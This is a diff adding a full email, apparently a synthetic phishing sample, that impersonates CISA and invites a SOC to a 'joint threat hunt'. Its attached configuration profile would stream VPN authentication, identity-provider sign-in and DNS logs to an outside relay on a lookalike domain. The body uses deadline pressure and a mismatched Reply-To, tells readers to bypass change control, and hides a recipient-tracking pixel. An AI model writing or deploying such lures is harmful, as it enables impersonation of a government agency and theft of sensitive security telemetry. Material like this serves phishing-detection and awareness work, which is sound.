@@ -1,0 +1,123 @@
+From: "CISA | Joint Threat Hunt Operations" <hunt-ops@cisa-jtt.example>
+To: soc-leads@corp.internal
+Cc: threat-intel@corp.internal, ir-oncall@corp.internal
+Reply-To: hunt-ops@relay.jcdc-partners.example
+Disposition-Notification-To: hunt-ops@cisa-jtt.example
+Date: Thu, 03 Dec 2026 12:00:00 -0500
+Message-ID: <0744-b73@synth.example>
+Subject: [INVITED] Joint Threat Hunt - RVV-2026-9002 (Water Curupira) - Private Sector Telemetry Onboarding Kit Attached
+MIME-Version: 1.0
+Content-Type: multipart/mixed; boundary="b73k"
+
+--b73k
+Content-Type: text/html; charset=utf-8
+
+<html><body style="font-family:-apple-system,'Segoe UI',sans-serif;font-size:14px">
+<p>SOC Leads, Threat Intelligence, IR On-call,</p>
+
+<p style="background:#E0F7FA;border-left:4px solid #006064;padding:12px">
+<b>JOINT THREAT HUNT — RVV-2026-9002 ("Water Curupira").</b>
+Your organization's sector is in the active targeting scope of a financially motivated intrusion set tracked as
+<b>Water Curupira</b>. Initial-access brokers associated with the set have re-used credentials matching patterns seen
+in your sector. You are invited to join a time-boxed joint hunt (JCDC-coordinated) starting Monday.
+<b>Telemetry onboarding kits must be activated before the weekend</b> to be included in the first sweep.
+</p>
+
+<h3>1. Campaign Summary (TLP:CLEAR portion)</h3>
+<table cellpadding=6 style="border-collapse:collapse;border:1px solid #ccc;width:100%">
+<tr><td style="background:#f5f5f5;width:250px">Tracking ID</td><td><b>RVV-2026-9002</b></td></tr>
+<tr><td style="background:#f5f5f5">Intrusion set</td><td>Water Curupira (financially motivated, IAB activity)</td></tr>
+<tr><td style="background:#f5f5f5">Sectors in scope</td><td>Industrial automation, precision manufacturing, logistics</td></tr>
+<tr><td style="background:#f5f5f5">Observed TTPs</td><td>TA0001 (T1190, T1133), TA0006 (T1110.004), TA0004 (T1486)</td></tr>
+<tr><td style="background:#f5f5f5">IOCs shared to date</td><td>214 (72 domains, 96 IPs, 46 hashes) — full set on the relay</td></tr>
+<tr><td style="background:#f5f5f5">Relevance to your org</td><td>One harvested-credential dump references a domain pattern matching your legacy SSO portal</td></tr>
+<tr><td style="background:#f5f5f5">Prior touchpoint</td><td>Your October phish incident <b>INC-2026-0417</b> is listed as "possibly related" pending telemetry</td></tr>
+</table>
+
+<h3>2. What the Joint Hunt Involves</h3>
+<ul>
+<li>Six-day coordinated sweep (Mon–Sat) across 41 participating organizations</li>
+<li>Participants stream selected log classes (VPN auth, IdP sign-ins, egress DNS) to the hunt relay</li>
+<li>Analysts receiveIOC feeds back in STIX 2.1 over the same relay</li>
+<li>Findings summarized in a joint report; attribution withheld until law-enforcement clearance</li>
+</ul>
+
+<h3>3. Onboarding Kit (Attached)</h3>
+<p>The attached profile <code>JCDC_onboarding.mobileconfig</code> configures the read-only telemetry forwarder
+for the hunt relay (it does <b>not</b> grant CISA any access to your environment):</p>
+<ol>
+<li>Install the profile on the log-collection appliance (macOS/Ubuntu profile handler both supported).</li>
+<li>The forwarder establishes an outbound-only tunnel to the relay; no inbound ports are opened.</li>
+<li>Activation must complete <b>before the weekend</b> — relay admission windows are batched, and the next
+batch after this one lands mid-hunt, halving your coverage.</li>
+</ol>
+
+<p style="background:#E0F7FA;padding:12px">We expect healthy skepticism about installing a profile from an email —
+that instinct is correct, and it is why the profile is signed, why the relay endpoint is printed in the profile
+itself (compare it against the one published in the JCDC partners catalog), and why the tunnel is egress-only.
+If your change-control process cannot complete review before the weekend, deploy in monitor-only mode now
+and complete change control in parallel; the hunt does not wait for individual CAB slots.</p>
+
+<h3>4. Timeline</h3>
+<ul>
+<li>Kit activation deadline: <b>before the weekend</b> (Fri 17:00 ET batch close)</li>
+<li>Hunt window: Monday 08:00 ET – Saturday 20:00 ET</li>
+<li>Daily findings pushed 07:00 ET; escalations via the relay's priority queue</li>
+</ul>
+
+<h3>5. If You Do Not Join</h3>
+<ul>
+<li>Your INC-2026-0417 correlation remains unresolved in the joint dataset</li>
+<li>Sector-level findings omit your telemetry coverage (flagged as "gap" in the final report)</li>
+<li>Rejoining mid-hunt is possible but your baseline window shrinks accordingly</li>
+</ul>
+
+<h3>6. Contact</h3>
+<p>Hunt operations desk: hunt-ops@relay.jcdc-partners.example<br>
+Reference: RVV-2026-9002 / participant ID PS-0417</p>
+
+<div style="height:1px;width:1px;overflow:hidden">
+<img src="https://cisa-jtt.example/px/hunt.gif?v=9002&p=PS-0417&r=soc-leads%40corp.internal" width=1 height=1 alt="">
+</div>
+
+<div style="border-top:1px solid #ddd;padding-top:10px;margin-top:16px;font-size:11px;color:#999">
+CISA | Joint Threat Hunt Operations | JCDC coordination<br>
+TLP:CLEAR summary. Detailed indicators are available on the relay to admitted participants only.
+</div>
+
+</body></html>
+--b73k
+Content-Type: application/octet-stream; name="JCDC_onboarding.mobileconfig"
+Content-Disposition: attachment; filename="JCDC_onboarding.mobileconfig"
+Content-Transfer-Encoding: 7bit
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//X//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+<dict>
+    <key>PayloadContent</key>
+    <array>
+        <dict>
+            <key>PayloadDisplayName</key>
+            <string>JCDC Hunt Relay Forwarder</string>
+            <key>PayloadType</key>
+            <string>com.jcdc.forwarder</string>
+            <key>RelayEndpoint</key>
+            <string>telemetry.relay.jcdc-partners.example:443</string>
+            <key>ParticipantID</key>
+            <string>PS-0417</string>
+            <key>LogClasses</key>
+            <array><string>vpn.auth</string><string>idp.signin</string><string>dns.egress</string></array>
+            <key>Mode</key>
+            <string>monitor</string>
+        </dict>
+    </array>
+    <key>PayloadIdentifier</key>
+    <string>gov.cisa.jtt.onboarding.PS-0417</string>
+    <key>PayloadOrganization</key>
+    <string>CISA Joint Threat Hunt Operations</string>
+    <key>PayloadRemovalDisallowed</key>
+    <false/>
+</dict>
+</plist>
+--b73k--
